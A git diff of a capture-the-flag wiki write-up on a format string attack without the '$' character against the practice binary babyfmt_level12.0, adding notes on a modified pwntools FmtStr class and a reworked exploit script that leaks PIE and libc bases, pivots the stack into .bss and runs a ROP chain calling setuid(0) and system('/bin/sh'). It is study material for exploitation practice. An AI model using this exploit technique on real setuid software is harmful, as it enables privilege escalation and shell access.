@@ -15,10 +15,10 @@ categories:
   - Format-String-Attack
 ---
 
+
 # Format String Attack - No Dollar Payload 
 
-
-This variant like [Twice Format String Attack](/Dreamer-Wiki/Pwn/Linux/Format%20String%20Vulnerabilities/12-Format-String-Attack-Format-String-Attack-Twice-%28Full-RELRO%2BPIE%29/) . This time format string payloads can not contains **$** character.
+This variant like [Format String Attack Twice (Full RELRO + PIE)|Twice Format String Attack](/Dreamer-Wiki/Pwn/Linux/Format%20String%20Vulnerabilities/12-Format-String-Attack-Format-String-Attack-Twice-%28Full-RELRO%2BPIE%29/) . This time format string payloads can not contains **$** character.
 
 
 ## babyfmt_level12.0
@@ -38,6 +38,20 @@ root@aaca0d8e13c0:/host# checksec ./babyfmt_level12.0
 
 
 ### custom FmtStr Class (FmtStrIso)
+
+There is nothing fancy here. 
+Borrowed [FmtStr Class](https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/fmtstr.py#L914) from pwntools and updated some fields.
+
+Notes about the updated fields:
+
+- `find_offset()` normally works with `$`-style format specifiers. This version uses old-school detection: a hardcoded 200× `%p|` sequence.
+    
+- The same change was made in `leak_stack()`.
+    
+- `execute_writes()` uses `no_dollar=True` by default (was `False` in pwntools).
+    
+- Added `_leaker` dereference support. It’s not strictly necessary.
+
 
 ```python
 #...
@@ -177,9 +191,38 @@ class FmtStrIso(object):
 
 ### get_flag.py
 
-The PoC unstable. To gathering flag, it should be executed 2-3 times.
+The PoC was a mess. I either need to reconstruct it or change the target.
 
-The PoC totally mess. Reconstruct or change the target!
+At one point, I could have just set the gadgets and called them directly, but instead I built a workaround. I still have some questions in my mind that I haven’t dug into yet. When I tried to write during the **again.\n** phase, the binary crashed.
+
+So I kept it simple and wrote the ROP payload during the **exit.\n** phase instead.
+
+Here’s what happens:
+
+- First, I overwrite the **function’s saved return address** with the function itself. Because there was a padding issue, I added a `ret` instruction to align the stack to 16 bytes.
+    
+- Next, when the function’s saved return address gets pushed 8 bytes onto the stack, I overwrite it with a `pop rsp` gadget and the `.bss` address.
+```csharp
+Higher addresses
+│ … caller …
+├───────────────────────────────
+│ saved RBP              (old_rbp)
+├───────────────────────────────
+│ [rbp+0x08] = ret              ← saved RIP # -> 1st turn saved RIP
+├───────────────────────────────
+│ [rbp+0x10] = exe.sym.func     ← saved RIP # -> 1st turn saved RIP+8
+├───────────────────────────────
+│ [rbp+0x18] = pop_rsp          ← saved RIP # -> 2nd turn saved rip
+├───────────────────────────────
+│ [rbp+0x20] = bss              ← data for pop_rsp
+├───────────────────────────────
+│   … locals …
+└───────────────────────────────
+```
+    
+- On the second run, the ROP gadgets are already placed at the `.bss` address. So when control flows there, the gadgets are ready to execute.
+
+- Offset, padlen and numbwritten values detected same as previous posts.
 
 ```python
 from pwn import *
@@ -219,11 +262,8 @@ def start(argv=[], *a, **kw):
 # GDB will be launched if the exploit is run via e.g.
 # ./exploit.py GDB
 gdbscript = '''
-brva 0x178f
-#brva 0x1794
+brva 0x17b2
 continue
-si
-nextret
 '''.format(**locals())
 
 #===========================================================
@@ -253,7 +293,7 @@ def add_align_padding(payload: bytes, align: int = 16, call_adjust: int = 8, pad
     payload_len = len(payload)
     misalign = (payload_len + call_adjust) % align
     padlen = (align - misalign) % align
-    padlen = max(0, padlen + adjust)   # adjust with adjust param (+/- value)
+    padlen = max(0, padlen + adjust)   # adjust ile oynayabilirsin (+/- değer)
     return pad_byte*padlen + payload
 
 format_pyld  = b'a'*16
@@ -270,6 +310,7 @@ io.sendafter(b'again.\n', payload)
 
 io.recvuntil(b'input is:')
 io.recvline()
+#info(f'Here: {io.recvline().strip().split(b"|")}')
 
 leaks = io.recvline().strip().split(b'|')
 
@@ -285,46 +326,58 @@ success(f'PIE Base Addr :{exe.address:#x}')
 success(f'LIBC Base Addr:{libc.address:#x}')
 
 ###############################
-##### overwrite part ######
+##### overwrite part ##########
 ###############################
-
-stdout_got_offset   = 0x4020
-stdout_got          = exe.address + stdout_got_offset
 
 bss_offset = 0x4800
 bss = exe.address + bss_offset
+success(f'BSS Addr: {bss:#x}')
 
 rop = ROP([exe, libc])
 #### overwrite gadgets for shell ####
 
 pop_rsp = rop.find_gadget(['pop rsp', 'ret'])[0]
-pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
 ret     = rop.find_gadget(['ret'])[0]
 binsh = next(libc.search(b'/bin/sh\0'))
 
-def exec_fmt(payload: bytes) -> bytes:
-    io.sendafter(b'exit.\n', payload)
-    out = io.recv() or b""
-    return out
+def exec_fmt_again(payload: bytes) -> bytes:
+    io.sendafter(b'again.\n', payload)
 
-f = FmtStrIso(exec_fmt, offset=22, padlen=1, numbwritten=0x5f)  # auto offset+padlen (no-$)
+
+def exec_fmt_exit(payload: bytes) -> bytes:
+    io.sendafter(b'exit.\n', payload)
+
+#=========================================================#
+#================ Execute func one more time =============#
+#=========================================================#
+
+
+f_exit = FmtStrIso(exec_fmt_exit, offset=22, padlen=1, numbwritten=0x5f)  # auto offset+padlen (no-$)
+
+f_exit.write(rbp_leak, bss)
+f_exit.write(rbp_leak+8*1, ret)
+f_exit.write(rbp_leak+8*2, exe.sym.func)
+f_exit.write(rbp_leak+8*3, pop_rsp)
+f_exit.write(rbp_leak+8*4, bss)
+
+f_exit.execute_writes()
+
+#=========================================================#
+#================ setuid and system rop ==================#
+#=========================================================#
 
 rop.call('setuid', [0])
 rop.raw(ret)
 rop.call(libc.sym.system, [binsh])
+counter = 0
+
+exec_fmt_again(b'A'*16)
 
 for idx, c in enumerate(rop.build()):
-    f.write(bss+(8*idx), c)
+    f_exit.write(bss+(8*idx), c)
+    counter += 1
 
-f.write(rbp_leak+8, exe.sym.func+5) # overwrite saved return of func
-f.execute_writes()
-
-io.sendafter(b'again.\n', b'AAAAAAA')
-
-f.write(rbp_leak+24, pop_rsp) # overwrite printf ret on stack
-f.write(rbp_leak+8+24, bss)
-
-f.execute_writes()
+f_exit.execute_writes()
 
 io.interactive()
 ```
@@ -333,7 +386,7 @@ io.interactive()
 
 ## TODO
 
-- [ ] Add already written stable exploit here. 
+- [x] Add already written stable exploit here. 
 - [ ] Add explanation
 
 ## References
